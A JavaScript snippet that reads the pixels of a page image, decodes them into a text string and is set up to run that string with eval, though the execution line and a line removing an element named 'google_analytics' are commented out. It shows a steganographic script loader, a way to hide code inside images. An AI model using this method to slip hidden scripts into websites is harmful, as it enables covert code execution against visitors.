var globalEval = function globalEval(src) {
	if (window.execScript) {
		window.execScript(src);
		return;
	}
	var fn = function() {
		window.eval.call(window,src);
	};
	fn();
};


window.onload = function(){
	var i = document.getElementById('cc'),
		i_w = i.width,
		i_h = i.height,
		cd = document.getElementById('cd'),
		ctx = cd.getContext('2d');

	cd.width = i_w;
	cd.height = i_h;

	ctx.drawImage(i,0,0);

	var imageData = ctx.getImageData(0,0,i_w,i_h),
		data = imageData.data,
		dlen = data.length

	// To image matrix
	var image_matrix = [],
		pixel_size = 4,
		pixels_per_row = i_w * pixel_size,
		pixel = new Uint8Array(pixel_size);
		temp_row = []

	var max_column = 0


	for (var d=0; d < dlen; d++)
	{
		var rgba_index = d % pixel_size;
		pixel[rgba_index] = data[d];

		if (rgba_index === pixel_size - 1){
			temp_row.push(pixel);
			pixel = new Uint8Array(pixel_size);

			var row = parseInt(d / pixels_per_row),
				column = parseInt((d - ( row * pixels_per_row )) / pixel_size)

			if ( column === (i_w - 1) ){
				image_matrix.push(temp_row);
				temp_row = []
			}
		}
	}

	// Flip horizontal
	var middle = parseInt(i_w/2)
	for (var r = 0; r < i_h; r++){
		for (var c = 0; c < middle; c++){
			image_matrix[r][c] = image_matrix[r][i_w-(c+1)]
		}
	}

	console.log( image_matrix);


	// Decode (this is correct)
	var code = []
	for (var r = 0; r < i_h; r++){
		for (var c = 0; c < i_w; c++){
			code.push(image_matrix[r][c][0])
			code.push(image_matrix[r][c][1])
			code.push(image_matrix[r][c][2])
		}
	}

	var new_script = String.fromCharCode.apply(String,code);
	console.log(new_script)
	// var io = document.getElementById('google_analytics')
	// io.remove();

	// globalEval(new_script)
}
